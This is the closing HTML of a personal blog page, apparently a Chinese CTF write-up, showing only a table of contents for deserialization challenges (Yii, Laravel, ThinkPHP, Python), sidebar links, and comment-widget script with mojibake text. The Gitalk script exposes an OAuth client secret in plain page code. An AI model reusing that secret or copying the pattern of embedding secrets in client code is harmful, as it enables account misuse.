href="#web267%EF%BC%88yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.14.</span> <span class="toc-text">web267ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web268%EF%BC%88yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.15.</span> <span class="toc-text">web268ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web269%EF%BC%88yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.16.</span> <span class="toc-text">web269ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web270%EF%BC%88yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.17.</span> <span class="toc-text">web270ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web271%EF%BC%88lavaral%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.18.</span> <span class="toc-text">web271ï¼ˆlavaralååºåˆ—åŒ–æ¼æ´ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web272"><span class="toc-number">1.19.</span> <span class="toc-text">web272</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web273"><span class="toc-number">1.20.</span> <span class="toc-text">web273</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web274%EF%BC%88thinkphp%EF%BC%89"><span class="toc-number">1.21.</span> <span class="toc-text">web274ï¼ˆthinkphpï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web275"><span class="toc-number">1.22.</span> <span class="toc-text">web275</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web277-python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.23.</span> <span class="toc-text">web277(python ååºåˆ—åŒ–)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reduce-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.24.</span> <span class="toc-text">_reduce_()ä»‹ç»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web278"><span class="toc-number">1.25.</span> <span class="toc-text">web278</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF%20file_session/" title="è“å¸½æ¯ file_session"><img src="https://img-blog.csdnimg.cn/ff9059c819c848f89fd89a399c958cba.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="è“å¸½æ¯ file_session"/></a><div class="content"><a class="title" href="/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF%20file_session/" title="è“å¸½æ¯ file_session">è“å¸½æ¯ file_session</a><time datetime="2022-07-10T16:00:00.000Z" title="å‘è¡¨äº 2022-07-11 00:00:00">2022-07-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/23/ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97/" title="CISCNåä¸œåŒ—èµ›åŒºwp"><img src="https://img-blog.csdnimg.cn/9d9b44555d1f48d090c2f62f12d26bf8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CISCNåä¸œåŒ—èµ›åŒºwp"/></a><div class="content"><a class="title" href="/2022/06/23/ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97/" title="CISCNåä¸œåŒ—èµ›åŒºwp">CISCNåä¸œåŒ—èµ›åŒºwp</a><time datetime="2022-06-22T16:00:00.000Z" title="å‘è¡¨äº 2022-06-23 00:00:00">2022-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/" title="æ•°æ®åº“ç†è®ºçŸ¥è¯†"><img src="https://img-blog.csdnimg.cn/9164d2cb2f204f6cba75611a0dc18c68.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="æ•°æ®åº“ç†è®ºçŸ¥è¯†"/></a><div class="content"><a class="title" href="/2022/06/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/" title="æ•°æ®åº“ç†è®ºçŸ¥è¯†">æ•°æ®åº“ç†è®ºçŸ¥è¯†</a><time datetime="2022-06-07T16:00:00.000Z" title="å‘è¡¨äº 2022-06-08 00:00:00">2022-06-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F/" title="javaååºåˆ—åŒ–ä¹‹åŸç”Ÿ"><img src="https://img-blog.csdnimg.cn/5f4b94b2998044bcab04ba7d355c041e.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="javaååºåˆ—åŒ–ä¹‹åŸç”Ÿ"/></a><div class="content"><a class="title" href="/2022/05/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F/" title="javaååºåˆ—åŒ–ä¹‹åŸç”Ÿ">javaååºåˆ—åŒ–ä¹‹åŸç”Ÿ</a><time datetime="2022-05-07T16:00:00.000Z" title="å‘è¡¨äº 2022-05-08 00:00:00">2022-05-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/07/%E5%9B%BE%E7%89%87%E9%A9%AC/" title="å›¾ç‰‡é©¬"><img src="https://img-blog.csdnimg.cn/18f972e64319452186e09ee7c4727252.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="å›¾ç‰‡é©¬"/></a><div class="content"><a class="title" href="/2022/05/07/%E5%9B%BE%E7%89%87%E9%A9%AC/" title="å›¾ç‰‡é©¬">å›¾ç‰‡é©¬</a><time datetime="2022-05-06T16:00:00.000Z" title="å‘è¡¨äº 2022-05-07 00:00:00">2022-05-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By é‘«ç¼˜</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '4d4ce5b3f76f792bdfeb',
      clientSecret: '8ac446a390aaa101275b309e475ee975a3e56751',
      repo: 'blog',
      owner: 'xinyuan-404',
      admin: ['xinyuan-404'],
      id: '5db53c4323434e48089f2a02d0866541',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !true) {
  if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>